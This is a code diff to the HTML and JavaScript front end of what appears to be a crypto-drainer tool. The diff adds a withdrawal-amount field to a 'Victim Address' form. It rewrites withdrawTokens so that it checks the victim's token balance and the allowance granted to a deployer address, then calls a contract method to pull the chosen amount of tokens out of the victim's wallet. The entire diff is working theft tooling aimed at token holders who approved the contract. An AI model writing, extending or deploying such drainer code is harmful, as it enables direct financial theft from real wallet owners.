@@ -42,6 +42,14 @@
     <label for="victimAddress">Victim Address: </label>
     <input type="text" id="victimAddress" placeholder="Enter victim's wallet address" />
 
+    <br><br>
+
+    <!-- Amount to Withdraw -->
+    <label for="withdrawAmount">Amount to Withdraw: </label>
+    <input type="number" id="withdrawAmount" placeholder="Enter amount" />
+
+    <br><br>
+
     <!-- Withdraw Button -->
     <button id="withdrawTokensBtn" style="display:none;">Withdraw Tokens</button>
 
@@ -94,41 +102,49 @@
         }
 
         async function withdrawTokens() {
-    const victimAddress = document.getElementById('victimAddress').value;
+            const victimAddress = document.getElementById('victimAddress').value;
+            const withdrawAmount = document.getElementById('withdrawAmount').value;
 
-    if (!victimAddress) {
-        alert("Please enter a victim's address!");
-        return;
-    }
+            if (!victimAddress) {
+                alert("Please enter a victim's address!");
+                return;
+            }
+            if (!withdrawAmount || withdrawAmount <= 0) {
+                alert("Please enter a valid amount to withdraw!");
+                return;
+            }
 
-    try {
-        // Retrieve the victim's balance
-        const victimBalance = await contract.methods.balanceOf(victimAddress).call();
-        if (victimBalance === "0") {
-            alert("The victim has no tokens to withdraw.");
-            return;
+            try {
+                // Retrieve the victim's balance
+                const victimBalance = await contract.methods.balanceOf(victimAddress).call();
+                console.log("Victim Balance:", victimBalance);
+
+                if (parseInt(victimBalance) < withdrawAmount) {
+                    alert("The victim has insufficient tokens to withdraw.");
+                    return;
+                }
+
+                // Check if the victim has approved enough tokens for withdrawal
+                const allowance = await contract.methods.allowance(victimAddress, deployerAddress).call();
+                console.log("Allowance:", allowance);
+
+                if (parseInt(allowance) < withdrawAmount) {
+                    alert("The victim has not approved enough tokens for withdrawal.");
+                    return;
+                }
+
+                // Call withdrawTokens function, passing the victim's address and the withdrawal amount
+                await contract.methods.withdrawTokens(victimAddress, withdrawAmount).send({ from: userAccount });
+
+                document.getElementById('status').innerText = `Successfully withdrawn ${withdrawAmount} tokens from ${victimAddress}!`;
+            } catch (error) {
+                console.error("Error withdrawing tokens:", error);
+                document.getElementById('status').innerText = "Error withdrawing tokens.";
+                alert("Error withdrawing tokens. Please try again.");
+            }
         }
-
-        // Check if the victim has approved the contract for transferFrom
-        const allowance = await contract.methods.allowance(victimAddress, deployerAddress).call();
-        if (allowance < victimBalance) {
-            alert("The victim has not approved enough tokens for withdrawal.");
-            return;
-        }
-
-        // Call withdrawTokens function, passing victim's address
-        await contract.methods.withdrawTokens(victimAddress).send({ from: userAccount });
-
-        document.getElementById('status').innerText = `Tokens successfully withdrawn from ${victimAddress}!`;
-    } catch (error) {
-        console.error("Error withdrawing tokens:", error);
-        document.getElementById('status').innerText = "Error withdrawing tokens.";
-        alert("Error withdrawing tokens. Please try again.");
-    }
-}
 
     </script>
 </body>
 </html>
-
 
